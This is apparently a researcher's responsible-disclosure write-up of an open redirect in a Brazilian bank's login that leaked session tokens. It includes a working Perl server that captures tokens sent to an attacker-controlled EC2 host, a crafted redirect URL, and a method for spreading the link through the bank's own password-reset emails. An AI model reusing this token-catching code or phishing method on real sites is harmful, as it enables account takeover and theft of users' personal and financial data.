---
layout: content
title: 'From an Open Redirect in a Brazilian Bank to Session Token Leak'
description: 'Through an open redirect on the financial institution website it was possible leak the users session token and realize an account takeover'
og_image: https://heitorgouvea.me/images/publications/caixa-account-takeover/email-poc.png
---

Table of contents:
- [Summary](#summary)
- [Description](#description)
- [Prooft of Concept](#proof-of-concept)
- [Impact](#impact)
- [Conclusion](#conclusion)
- [References](#references)

---

### Summary

This publication aims to share an Open Redirect vulnerability[1] discovered on the Caixa Econômica Federal website, through which it was possible to expose user Session Tokens.

It should be clarified that during all tests, the only account used was the one for which authorization was granted by the account holder. No other user accounts or information were accessed or violated during the development of this research and proof of concept.

Timeline:

```plaintext
01/01/2020: Vulnerability discovered and proof of concept created;
01/05/2020: The vulnerability was reported;
01/07/2020: Vulnerability confirmed by Caixa Econômica Federal;
01/10/2020: Vulnerability fixed;
01/10/2020: Technical article published;
```

---

### Description

While navigating the Caixa Federal systems' web pages, an authentication screen was identified, asking for access credentials such as CPF (similar to Social Security Number), NIS, email, and a password. The page in question is the authentication screen for accessing the Portal Cidadão dashboard.

![Caixa Federal Home Page Website](/images/publications/caixa-account-takeover/home-page.png)

-

The URL in question was as follows:

[http://acessoseguro.sso.caixa.gov.br/cidadao/auth?response_type=code&client_id=portal-inter&segmento=CIDADAO01&template=portal&redirect_uri=http://acessoseguro.sso.caixa.gov.br]()

The last parameter in the URL presents a potential Open Redirect vulnerability: &redirect_uri=. The value inserted in this parameter indicates the URL to which the user will be redirected after completing the login process.

To validate this, the value of the &redirect_uri= parameter in the original URL was changed to the Google homepage URL. After entering valid credentials and logging in, the following result was obtained:

<iframe width="100%" height="523" src="https://www.youtube.com/embed/d6EXPMQPcZw" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture"></iframe>

-

As shown, the application has an Open Redirect vulnerability. However, another detail was noticed: during the redirection, an additional parameter was sent, as observed in the URL:

[https://google.com/?code=e629bd01-00cd-4b67-8f5d-f7fc50c2a9c7](https://google.com/?code=e629bd01-00cd-4b67-8f5d-f7fc50c2a9c7)

After analyzing the ?code= parameter and the original request, it was verified that the value of this parameter corresponds to a Session Token[[2]](#references).

With this finding, it became evident that this vulnerability has a high severity, as the user could fall victim to an attack where they are redirected to a malicious URL controlled by an attacker, who can capture the Session Token. By doing so, the attacker gains access to the user's account, compromising the confidentiality and integrity of their data.

---

### Proof Of Concept

To demonstrate the possibility of token leakage and capture, the following code was used:

```perl
#!/usr/bin/env perl
# perl catcher.pl daemon -m production -l http://\*:8080

use 5.030;
use strict;
use warnings;
use Mojolicious::Lite -signatures;

get "/" => sub ($catcher) {
    $catcher -> res -> headers -> header("Access-Control-Allow-Origin" => "*");

    my $code = $catcher -> param("code");

    open (my $logs, ">>", "catcher.logs");
    print $logs "[+] - New Session Token -> '$code' has been catch.\n";
    close ($logs);

    return ($catcher -> render (
        text => "<script>window.location='https://acessoseguro.sso.caixa.gov.br/portal/login/?code=$code'</script>"
    ));

};

app -> start();
```

-

This code is responsible for capturing and storing Session Tokens sent to a "malicious" URL controlled by the attacker. In addition to capturing the Session Token and storing it in a log file, the script redirects the user back to the legitimate URL, ensuring they obtain a valid session on the Caixa Federal system. As such, it is unlikely that an average user would realize they are being deceived. The proof of concept URL is structured as follows:

[https://acessoseguro.sso.caixa.gov.br/cidadao/auth?response_type=code&client_id=portal-inter&segmento=CIDADAO01&template=portal&redirect_uri=http://ec2-54-84-102-177.compute-1.amazonaws.com/](https://acessoseguro.sso.caixa.gov.br/cidadao/auth?response_type=code&client_id=portal-inter&segmento=CIDADAO01&template=portal&redirect_uri=http://ec2-54-84-102-177.compute-1.amazonaws.com/)

The result obtained can be observed in this recording:

<iframe width="100%" height="523" src="https://www.youtube.com/embed/l2ZpggLSz_o" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture"></iframe>

--

The attack surface in this scenario is still limited, requiring the user to access the URL themselves (via phishing or social engineering).

In addition to this vulnerability, it was discovered that the value of the &redirect_uri= parameter present on the page is also used in the email when a user requests a password reset through the "Register/Forgot my password" button. To use this functionality, we can fill in the victim's email or CPF. After filling out the information, a link with the malicious value injected to set the new password is sent by email.

When requesting a new password from the malicious URL, the content of the email will be as follows:

![Caixa Federal Email Forgot Password](/images/publications/caixa-account-takeover/email-poc.png)

-

The email is sent by an official Caixa Federal system. However, upon examining the link, we can see that the URL is "infected" with the attacker's link. When accessing the link and completing the password reset, the redirection still occurs, resulting in the leakage of the Session Token.

Thus, an attacker can use this mechanism to send emails requesting password resets on behalf of Caixa Econômica Federal, lending greater credibility to the malicious link. This attack can be performed on a large scale, as only the target's CPF is required.

---

### Impact

If this vulnerability were exploited, an attacker could view confidential user information as demonstrated below:

![Caixa Federal Confidential Data User](/images/publications/caixa-account-takeover/confidential-data-user.png)

- Full Name, CPF (Social Security Number), Last Access Date & Time

-

![Caixa Federal Confidential Data FGTS](/images/publications/caixa-account-takeover/confidential-data-fgts.png)

- Full Name, PIS Number, Contracting Company, Work Card Number, FGTS Account, Admission Date, Total Account Balance and also the amount deposited each month during the period worked at the Company

-

![Caixa Federal Confidential User Andress](/images/publications/caixa-account-takeover/confidential-user-andress.png)

- User's full address (You can change this data, password is not required)

---

### Conclusion

An attacker could exploit the vulnerabilities mentioned above to breach the confidentiality of several legitimate Caixa Econômica Federal user accounts.

It was advised that Caixa Econômica Federal conduct an investigation to verify whether these vulnerabilities were being exploited by malicious actors in conducting fraud.

---

### References

- [1] [https://portswigger.net/kb/issues/00500100_open-redirection-reflected](https://portswigger.net/kb/issues/00500100_open-redirection-reflected)
- [2] [https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html)
- [3] [https://www.owasp.org/index.php/Session_hijacking_attack](https://www.owasp.org/index.php/Session_hijacking_attack)